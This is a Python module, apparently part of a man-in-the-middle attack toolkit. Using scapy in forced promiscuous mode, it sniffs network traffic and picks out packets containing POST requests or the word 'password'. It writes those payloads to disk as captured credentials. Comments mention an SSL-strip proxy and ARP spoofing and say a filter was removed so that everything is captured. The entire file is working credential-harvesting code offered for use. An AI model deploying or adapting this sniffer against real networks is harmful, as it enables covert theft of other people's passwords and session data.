import scapy.all as scapy
import uuid
import time
from . import STATUS, STOP_EVENT, CAPTURE_DIR
from .utils import log_msg, set_promiscuous_mode

def packet_callback(packet):
    if STOP_EVENT.is_set(): return
    
    # --- DELETED THE SILENT FILTER BLOCK HERE ---
    # We now capture EVERYTHING in Promiscuous mode, even in Silent Mode.

    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Ignore own SSL Strip Proxy Traffic (Port 10000)
            if packet[scapy.TCP].sport == 10000 or packet[scapy.TCP].dport == 10000:
                return 

            is_sensitive = "POST " in payload or "password" in payload
            if is_sensitive:
                # 1. Generate Consistent Name (Time + Source)
                timestamp_id = time.strftime('%H%M%S')
                clean_src = packet[scapy.IP].src.replace('.', '-')
                pkt_id = f"{timestamp_id}_{clean_src}"
                
                src = packet[scapy.IP].src
                
                # 2. Save File
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f: f.write(payload)
                
                data_entry = {
                    "id": pkt_id, "time": time.strftime('%H:%M:%S'),
                    "src": src, "dst": packet[scapy.IP].dst,
                    "snippet": f"[SECRET] {payload[:80]}", "type": "ALERT"
                }
                
                # 3. SAVE TO BOTH LISTS (View + History)
                STATUS["intercepted_data"].append(data_entry)
                STATUS["all_intercepted_data"].append(data_entry) 
                
                log_msg(f"[ALERT] Creds captured from {src}")
        except: pass

def start_sniffer():
    interface = STATUS["interface"]
    # Force Promiscuous Mode so we see traffic even if not ARP Spoofing
    set_promiscuous_mode(interface, True)
    try:
        scapy.sniff(iface=interface, store=0, prn=packet_callback, stop_filter=lambda p: STOP_EVENT.is_set())
    except Exception as e:
        log_msg(f"[!] Sniffer Error: {e}")
    finally:
        set_promiscuous_mode(interface, False)